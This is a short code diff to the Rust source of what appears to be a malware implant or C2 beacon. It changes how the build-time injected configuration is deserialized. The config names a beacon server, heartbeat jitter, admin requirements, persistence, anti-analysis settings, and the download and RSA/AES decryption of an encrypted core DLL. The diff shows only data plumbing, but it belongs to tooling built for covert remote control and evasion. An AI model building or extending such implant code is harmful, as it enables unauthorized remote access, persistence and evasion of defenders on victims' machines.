@@ -344,28 +344,36 @@ impl Default for AntiAnalysisConfig {
 }
 
 /// Config data injected into the binary at build time.
+/// Accepts both camelCase (Rust) and snake_case (C#) field names.
 #[derive(Debug, Clone, Serialize, Deserialize)]
+#[serde(rename_all = "camelCase")]
 pub struct InjectedConfig {
+    #[serde(alias = "server_url")]
     pub server_url: String,
+    #[serde(alias = "register_path")]
     pub register_path: String,
+    #[serde(alias = "heartbeat_path")]
     pub heartbeat_path: String,
+    #[serde(alias = "result_path")]
     pub result_path: String,
+    #[serde(alias = "ws_path")]
     pub ws_path: String,
+    #[serde(alias = "heartbeat_interval_ms")]
     pub heartbeat_interval_ms: u64,
+    #[serde(alias = "jitter_percent")]
     pub jitter_percent: f64,
+    #[serde(alias = "require_admin")]
     pub require_admin: bool,
+    #[serde(alias = "copy_to_path")]
     pub copy_to_path: Option<String>,
+    #[serde(alias = "enable_persistence")]
     pub enable_persistence: bool,
-    /// Base64-encoded RSA-OAEP encrypted AES-256 key (for core DLL decryption)
-    #[serde(default)]
+    #[serde(default, alias = "encrypted_aes_key")]
     pub encrypted_aes_key: String,
-    /// Server path to download the encrypted core DLL, e.g. "/api/beacon/core/{buildId}"
-    #[serde(default)]
+    #[serde(default, alias = "core_download_path")]
     pub core_download_path: String,
-    /// Base64-encoded PKCS#8 DER RSA private key (for decrypting the AES key)
-    #[serde(default)]
+    #[serde(default, alias = "rsa_private_key")]
     pub rsa_private_key: String,
-    /// Anti-analysis configuration
-    #[serde(default)]
+    #[serde(default, alias = "anti_analysis")]
     pub anti_analysis: AntiAnalysisConfig,
 }
